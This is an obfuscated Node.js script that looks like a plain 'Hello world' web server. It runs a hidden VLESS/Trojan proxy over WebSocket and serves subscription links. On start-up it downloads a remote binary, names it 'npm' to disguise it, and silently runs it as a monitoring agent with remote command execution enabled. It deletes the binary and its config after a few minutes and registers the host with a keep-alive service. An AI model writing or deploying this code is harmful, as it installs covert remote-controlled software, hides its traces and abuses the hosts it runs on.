const _0x1a647a=_0x564f;(function(_0x5b60c1,_0x41da76){const _0x498a84=_0x564f,_0x18b7ff=_0x5b60c1();while(!![]){try{const _0x1f34c7=-parseInt(_0x498a84(0xd7))/0x1+parseInt(_0x498a84(0x103))/0x2*(parseInt(_0x498a84(0xcd))/0x3)+-parseInt(_0x498a84(0xcc))/0x4+-parseInt(_0x498a84(0x12e))/0x5+-parseInt(_0x498a84(0xf7))/0x6*(parseInt(_0x498a84(0xcb))/0x7)+parseInt(_0x498a84(0x109))/0x8*(-parseInt(_0x498a84(0x11a))/0x9)+parseInt(_0x498a84(0x11f))/0xa;if(_0x1f34c7===_0x41da76)break;else _0x18b7ff['push'](_0x18b7ff['shift']());}catch(_0x3aa009){_0x18b7ff['push'](_0x18b7ff['shift']());}}}(_0x411d,0x6d5fc));function _0x564f(_0x116aa8,_0x51d7bf){const _0x411dd6=_0x411d();return _0x564f=function(_0x564fb9,_0x16e451){_0x564fb9=_0x564fb9-0xba;let _0x4ff501=_0x411dd6[_0x564fb9];return _0x4ff501;},_0x564f(_0x116aa8,_0x51d7bf);}const os=require('os'),http=require(_0x1a647a(0xd1)),fs=require('fs'),axios=require(_0x1a647a(0xf6)),net=require('net'),path=require(_0x1a647a(0xca)),crypto=require(_0x1a647a(0x130)),{Buffer}=require(_0x1a647a(0xe7)),{exec,execSync}=require(_0x1a647a(0x128)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x1a647a(0xbc),NEZHA_SERVER=process['env'][_0x1a647a(0x100)]||'',NEZHA_PORT=process[_0x1a647a(0xef)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x1a647a(0xef)]['NEZHA_KEY']||'',DOMAIN=process[_0x1a647a(0xef)][_0x1a647a(0x104)]||'1234.abc.com',AUTO_ACCESS=process[_0x1a647a(0xef)][_0x1a647a(0x121)]||![],WSPATH=process[_0x1a647a(0xef)][_0x1a647a(0xdf)]||UUID[_0x1a647a(0xfd)](0x0,0x8),SUB_PATH=process[_0x1a647a(0xef)]['SUB_PATH']||_0x1a647a(0xfb),NAME=process['env'][_0x1a647a(0xff)]||'',PORT=process[_0x1a647a(0xef)]['PORT']||0xbb8;let ISP='';const GetISP=async()=>{const _0x308638=_0x1a647a;try{const _0x9370cf=await axios[_0x308638(0x120)]('https://speed.cloudflare.com/meta'),_0x33e132=_0x9370cf[_0x308638(0xd3)];ISP=(_0x33e132[_0x308638(0x112)]+'-'+_0x33e132[_0x308638(0xbf)])['replace'](/ /g,'_');}catch(_0x15f7a5){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x59fd4d,_0x3250b4)=>{const _0x100a14=_0x1a647a;if(_0x59fd4d[_0x100a14(0x125)]==='/'){const _0x5d5369=path['join'](__dirname,_0x100a14(0xbb));fs[_0x100a14(0xe3)](_0x5d5369,_0x100a14(0xdb),(_0x150776,_0xdd4673)=>{const _0x148647=_0x100a14;if(_0x150776){_0x3250b4['writeHead'](0xc8,{'Content-Type':_0x148647(0x12b)}),_0x3250b4[_0x148647(0xdd)](_0x148647(0x111));return;}_0x3250b4[_0x148647(0xc0)](0xc8,{'Content-Type':_0x148647(0x12b)}),_0x3250b4['end'](_0xdd4673);});return;}else{if(_0x59fd4d[_0x100a14(0x125)]==='/'+SUB_PATH){const _0x419003=NAME?NAME+'-'+ISP:ISP,_0x42376e=_0x100a14(0x10f)+UUID+_0x100a14(0xe5)+DOMAIN+_0x100a14(0xee)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x419003,_0x12adbf=_0x100a14(0xd4)+UUID+_0x100a14(0xf2)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x419003,_0x4b403c=_0x42376e+'\x0a'+_0x12adbf,_0x483b05=Buffer[_0x100a14(0x115)](_0x4b403c)[_0x100a14(0xed)](_0x100a14(0xe1));_0x3250b4['writeHead'](0xc8,{'Content-Type':_0x100a14(0xe0)}),_0x3250b4[_0x100a14(0xdd)](_0x483b05+'\x0a');}else _0x3250b4[_0x100a14(0xc0)](0x194,{'Content-Type':_0x100a14(0xe0)}),_0x3250b4[_0x100a14(0xdd)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x1a647a(0xf3))]({'server':httpServer}),uuid=UUID[_0x1a647a(0x12a)](/-/g,''),DNS_SERVERS=[_0x1a647a(0xf1),_0x1a647a(0x126)];function resolveHost(_0x5cc915){return new Promise((_0x1d6dfc,_0x1bf255)=>{const _0x2b15c4=_0x564f;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2b15c4(0xe9)](_0x5cc915)){_0x1d6dfc(_0x5cc915);return;}let _0x496067=0x0;function _0x19b07c(){const _0x3b093f=_0x2b15c4;if(_0x496067>=DNS_SERVERS['length']){_0x1bf255(new Error(_0x3b093f(0xd0)+_0x5cc915+_0x3b093f(0x131)));return;}const _0x591204=DNS_SERVERS[_0x496067];_0x496067++;const _0x2e0170=_0x3b093f(0xeb)+encodeURIComponent(_0x5cc915)+'&type=A';axios[_0x3b093f(0x120)](_0x2e0170,{'timeout':0x1388,'headers':{'Accept':_0x3b093f(0x110)}})[_0x3b093f(0xdc)](_0x5959cb=>{const _0x5c32ef=_0x3b093f,_0x417ee8=_0x5959cb[_0x5c32ef(0xd3)];if(_0x417ee8[_0x5c32ef(0xe6)]===0x0&&_0x417ee8[_0x5c32ef(0xbd)]&&_0x417ee8[_0x5c32ef(0xbd)][_0x5c32ef(0xd2)]>0x0){const _0x43fbe0=_0x417ee8['Answer'][_0x5c32ef(0xd9)](_0x149b80=>_0x149b80[_0x5c32ef(0xc2)]===0x1);if(_0x43fbe0){_0x1d6dfc(_0x43fbe0[_0x5c32ef(0xd3)]);return;}}_0x19b07c();})[_0x3b093f(0x116)](_0x51b066=>{_0x19b07c();});}_0x19b07c();});}function handleVlessConnection(_0xef7c3d,_0x287c1){const _0x152851=_0x1a647a,[_0x485511]=_0x287c1,_0x4c2ea7=_0x287c1[_0x152851(0xfd)](0x1,0x11);if(!_0x4c2ea7[_0x152851(0xd5)]((_0x42de01,_0x1ea418)=>_0x42de01==parseInt(uuid[_0x152851(0x117)](_0x1ea418*0x2,0x2),0x10)))return![];let _0x50cc32=_0x287c1[_0x152851(0xfd)](0x11,0x12)[_0x152851(0xba)]()+0x13;const _0x3b29ef=_0x287c1['slice'](_0x50cc32,_0x50cc32+=0x2)[_0x152851(0x105)](0x0),_0x232ca1=_0x287c1[_0x152851(0xfd)](_0x50cc32,_0x50cc32+=0x1)[_0x152851(0xba)](),_0x40e364=_0x232ca1==0x1?_0x287c1[_0x152851(0xfd)](_0x50cc32,_0x50cc32+=0x4)[_0x152851(0xc5)]('.'):_0x232ca1==0x2?new TextDecoder()['decode'](_0x287c1[_0x152851(0xfd)](_0x50cc32+0x1,_0x50cc32+=0x1+_0x287c1[_0x152851(0xfd)](_0x50cc32,_0x50cc32+0x1)[_0x152851(0xba)]())):_0x232ca1==0x3?_0x287c1[_0x152851(0xfd)](_0x50cc32,_0x50cc32+=0x10)[_0x152851(0xbe)]((_0x41c207,_0x55d7bf,_0x3ade6e,_0x4cc326)=>_0x3ade6e%0x2?_0x41c207[_0x152851(0x101)](_0x4cc326[_0x152851(0xfd)](_0x3ade6e-0x1,_0x3ade6e+0x1)):_0x41c207,[])[_0x152851(0x10d)](_0x93c9c4=>_0x93c9c4[_0x152851(0x105)](0x0)[_0x152851(0xed)](0x10))[_0x152851(0xc5)](':'):'';_0xef7c3d[_0x152851(0xe4)](new Uint8Array([_0x485511,0x0]));const _0x1881ec=createWebSocketStream(_0xef7c3d);return resolveHost(_0x40e364)[_0x152851(0xdc)](_0x5cc81b=>{const _0x117bd0=_0x152851;net[_0x117bd0(0xc8)]({'host':_0x5cc81b,'port':_0x3b29ef},function(){const _0x27e669=_0x117bd0;this[_0x27e669(0xc7)](_0x287c1[_0x27e669(0xfd)](_0x50cc32)),_0x1881ec['on'](_0x27e669(0xf8),()=>{})[_0x27e669(0xec)](this)['on'](_0x27e669(0xf8),()=>{})['pipe'](_0x1881ec);})['on']('error',()=>{});})[_0x152851(0x116)](_0x5052eb=>{net['connect']({'host':_0x40e364,'port':_0x3b29ef},function(){const _0x16bcd4=_0x564f;this[_0x16bcd4(0xc7)](_0x287c1[_0x16bcd4(0xfd)](_0x50cc32)),_0x1881ec['on']('error',()=>{})['pipe'](this)['on'](_0x16bcd4(0xf8),()=>{})[_0x16bcd4(0xec)](_0x1881ec);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x5ace67,_0x104f3f){const _0x227c75=_0x1a647a;try{if(_0x104f3f[_0x227c75(0xd2)]<0x3a)return![];const _0x3a5e0c=_0x104f3f[_0x227c75(0xfd)](0x0,0x38)[_0x227c75(0xed)](),_0x3575d2=[UUID];let _0x3276ff=null;for(const _0x51684a of _0x3575d2){const _0x11c1c2=crypto['createHash'](_0x227c75(0x102))['update'](_0x51684a)[_0x227c75(0xc6)]('hex');if(_0x11c1c2===_0x3a5e0c){_0x3276ff=_0x51684a;break;}}if(!_0x3276ff)return![];let _0x14905e=0x38;_0x104f3f[_0x14905e]===0xd&&_0x104f3f[_0x14905e+0x1]===0xa&&(_0x14905e+=0x2);const _0x50edff=_0x104f3f[_0x14905e];if(_0x50edff!==0x1)return![];_0x14905e+=0x1;const _0x53fd15=_0x104f3f[_0x14905e];_0x14905e+=0x1;let _0x4f9f84,_0x566f89;if(_0x53fd15===0x1)_0x4f9f84=_0x104f3f['slice'](_0x14905e,_0x14905e+0x4)[_0x227c75(0xc5)]('.'),_0x14905e+=0x4;else{if(_0x53fd15===0x3){const _0x358176=_0x104f3f[_0x14905e];_0x14905e+=0x1,_0x4f9f84=_0x104f3f[_0x227c75(0xfd)](_0x14905e,_0x14905e+_0x358176)[_0x227c75(0xed)](),_0x14905e+=_0x358176;}else{if(_0x53fd15===0x4)_0x4f9f84=_0x104f3f[_0x227c75(0xfd)](_0x14905e,_0x14905e+0x10)[_0x227c75(0xbe)]((_0x57eebb,_0x527c9e,_0x4ae15e,_0x1a3769)=>_0x4ae15e%0x2?_0x57eebb[_0x227c75(0x101)](_0x1a3769[_0x227c75(0xfd)](_0x4ae15e-0x1,_0x4ae15e+0x1)):_0x57eebb,[])['map'](_0xa015d6=>_0xa015d6[_0x227c75(0x105)](0x0)[_0x227c75(0xed)](0x10))[_0x227c75(0xc5)](':'),_0x14905e+=0x10;else return![];}}_0x566f89=_0x104f3f[_0x227c75(0x105)](_0x14905e),_0x14905e+=0x2;_0x14905e<_0x104f3f[_0x227c75(0xd2)]&&_0x104f3f[_0x14905e]===0xd&&_0x104f3f[_0x14905e+0x1]===0xa&&(_0x14905e+=0x2);const _0x1f28bb=createWebSocketStream(_0x5ace67);return resolveHost(_0x4f9f84)['then'](_0x316212=>{const _0x12f220=_0x227c75;net[_0x12f220(0xc8)]({'host':_0x316212,'port':_0x566f89},function(){const _0x48aa11=_0x12f220;_0x14905e<_0x104f3f[_0x48aa11(0xd2)]&&this[_0x48aa11(0xc7)](_0x104f3f['slice'](_0x14905e)),_0x1f28bb['on'](_0x48aa11(0xf8),()=>{})[_0x48aa11(0xec)](this)['on'](_0x48aa11(0xf8),()=>{})[_0x48aa11(0xec)](_0x1f28bb);})['on'](_0x12f220(0xf8),()=>{});})[_0x227c75(0x116)](_0x111874=>{const _0x56155d=_0x227c75;net[_0x56155d(0xc8)]({'host':_0x4f9f84,'port':_0x566f89},function(){const _0x38eff4=_0x56155d;_0x14905e<_0x104f3f['length']&&this[_0x38eff4(0xc7)](_0x104f3f['slice'](_0x14905e)),_0x1f28bb['on']('error',()=>{})[_0x38eff4(0xec)](this)['on'](_0x38eff4(0xf8),()=>{})[_0x38eff4(0xec)](_0x1f28bb);})['on'](_0x56155d(0xf8),()=>{});}),!![];}catch(_0x39bd41){return![];}}function _0x411d(){const _0x11651e=['trojan://','every','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','886599nBaoGZ','https://arm64.ssss.nyc.mn/agent','find','log','utf8','then','end','npm\x20download\x20successfully','WSPATH','text/plain','base64','message','readFile','send','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','Status','buffer','unlink','test','post','https://dns.google/resolve?name=','pipe','toString','&fp=chrome&type=ws&host=','env','2087','8.8.4.4','@cdns.doon.eu.org:443?security=tls&sni=','Server','setsid\x20nohup\x20./npm\x20-s\x20','close','axios','54IaVive','error','npm\x20is\x20running','stream','sub','split','slice','https://oooo.serv00.net/add-url','NAME','NEZHA_SERVER','concat','sha224','50LviNko','DOMAIN','readUInt16BE','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://amd64.ssss.nyc.mn/v1','npm\x20running\x20error:','8tkSnan','true','https://amd64.ssss.nyc.mn/agent','createWriteStream','map','2083','vless://','application/dns-json','Hello\x20world!','country','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','arch','from','catch','substr','npm','Automatic\x20Access\x20Task\x20added\x20successfully','7628913ufXmBj','once','finish','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','npm\x20is\x20already\x20running,\x20skip\x20running...','39659070oTuJwr','get','AUTO_ACCESS','includes','https://arm64.ssss.nyc.mn/v1','listen','url','1.1.1.1','2053','child_process','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','replace','text/html','error:\x20','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','2653500aBOknl','client_secret:\x20','crypto','\x20with\x20all\x20DNS\x20servers','readUInt8','index.html','38d85f5a-f46c-490f-9ed9-a0776b132b0f','Answer','reduce','asOrganization','writeHead','utf-8','type','--tls','8443','join','digest','write','connect','pop','path','588175fXIOfv','3049920VuIOiz','31890WhHTrF','false','trim','Failed\x20to\x20resolve\x20','http','length','data'];_0x411d=function(){return _0x11651e;};return _0x411d();}wss['on']('connection',(_0x5d8dca,_0x2718be)=>{const _0x3f7a2c=_0x1a647a,_0x53ce28=_0x2718be[_0x3f7a2c(0x125)]||'';_0x5d8dca[_0x3f7a2c(0x11b)](_0x3f7a2c(0xe2),_0x60317c=>{const _0x25d2e2=_0x3f7a2c;if(_0x60317c[_0x25d2e2(0xd2)]>0x11&&_0x60317c[0x0]===0x0){const _0x334ea1=_0x60317c['slice'](0x1,0x11),_0x346c07=_0x334ea1[_0x25d2e2(0xd5)]((_0x24a1df,_0x4b1ea4)=>_0x24a1df==parseInt(uuid[_0x25d2e2(0x117)](_0x4b1ea4*0x2,0x2),0x10));if(_0x346c07){!handleVlessConnection(_0x5d8dca,_0x60317c)&&_0x5d8dca[_0x25d2e2(0xf5)]();return;}}!handleTrojanConnection(_0x5d8dca,_0x60317c)&&_0x5d8dca[_0x25d2e2(0xf5)]();})['on'](_0x3f7a2c(0xf8),()=>{});});const getDownloadUrl=()=>{const _0x23b7f3=_0x1a647a,_0x5d9f41=os[_0x23b7f3(0x114)]();return _0x5d9f41==='arm'||_0x5d9f41==='arm64'||_0x5d9f41==='aarch64'?!NEZHA_PORT?_0x23b7f3(0x123):_0x23b7f3(0xd8):!NEZHA_PORT?_0x23b7f3(0x107):_0x23b7f3(0x10b);},downloadFile=async()=>{const _0xb2b4f1=_0x1a647a;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1a1b15=getDownloadUrl(),_0xeb3ffa=await axios({'method':_0xb2b4f1(0x120),'url':_0x1a1b15,'responseType':_0xb2b4f1(0xfa)}),_0x3e6365=fs[_0xb2b4f1(0x10c)](_0xb2b4f1(0x118));return _0xeb3ffa[_0xb2b4f1(0xd3)][_0xb2b4f1(0xec)](_0x3e6365),new Promise((_0x1bdfb7,_0x177da3)=>{const _0x34bb18=_0xb2b4f1;_0x3e6365['on'](_0x34bb18(0x11c),()=>{const _0x51f7f2=_0x34bb18;console[_0x51f7f2(0xda)](_0x51f7f2(0xde)),exec('chmod\x20+x\x20npm',_0x13a9a2=>{if(_0x13a9a2)_0x177da3(_0x13a9a2);_0x1bdfb7();});}),_0x3e6365['on'](_0x34bb18(0xf8),_0x177da3);});}catch(_0x94d36d){throw _0x94d36d;}},runnz=async()=>{const _0x2cfac8=_0x1a647a;try{const _0x2885a3=execSync(_0x2cfac8(0x12d),{'encoding':_0x2cfac8(0xc1)});if(_0x2885a3[_0x2cfac8(0xcf)]()!==''){console['log'](_0x2cfac8(0x11e));return;}}catch(_0x2e4bdd){}await downloadFile();let _0x532994='',_0x370f71=['443',_0x2cfac8(0xc4),'2096',_0x2cfac8(0xf0),_0x2cfac8(0x10e),_0x2cfac8(0x127)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5b95f2=_0x370f71[_0x2cfac8(0x122)](NEZHA_PORT)?_0x2cfac8(0xc3):'';_0x532994=_0x2cfac8(0xf4)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5b95f2+_0x2cfac8(0xd6);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x333e53=NEZHA_SERVER[_0x2cfac8(0x122)](':')?NEZHA_SERVER[_0x2cfac8(0xfc)](':')[_0x2cfac8(0xc9)]():'',_0x7cc45b=_0x370f71[_0x2cfac8(0x122)](_0x333e53)?_0x2cfac8(0x10a):_0x2cfac8(0xce),_0x20aa34=_0x2cfac8(0x12f)+NEZHA_KEY+_0x2cfac8(0x106)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x7cc45b+_0x2cfac8(0x11d)+UUID;fs['writeFileSync']('config.yaml',_0x20aa34);}_0x532994=_0x2cfac8(0x113);}else{console[_0x2cfac8(0xda)](_0x2cfac8(0x129));return;}}try{exec(_0x532994,{'shell':'/bin/bash'},_0x25246b=>{const _0x38f274=_0x2cfac8;if(_0x25246b)console[_0x38f274(0xf8)](_0x38f274(0x108),_0x25246b);else console[_0x38f274(0xda)](_0x38f274(0xf9));});}catch(_0x22961a){console[_0x2cfac8(0xf8)](_0x2cfac8(0x12c)+_0x22961a);}};async function addAccessTask(){const _0x2e7577=_0x1a647a;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x39c44b='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x54c473=await axios[_0x2e7577(0xea)](_0x2e7577(0xfe),{'url':_0x39c44b},{'headers':{'Content-Type':'application/json'}});console[_0x2e7577(0xda)](_0x2e7577(0x119));}catch(_0xf5c463){}}const delFiles=()=>{const _0x3ec46d=_0x1a647a;fs[_0x3ec46d(0xe8)](_0x3ec46d(0x118),()=>{}),fs[_0x3ec46d(0xe8)]('config.yaml',()=>{});};httpServer[_0x1a647a(0x124)](PORT,()=>{const _0x3de0d3=_0x1a647a;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3de0d3(0xda)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
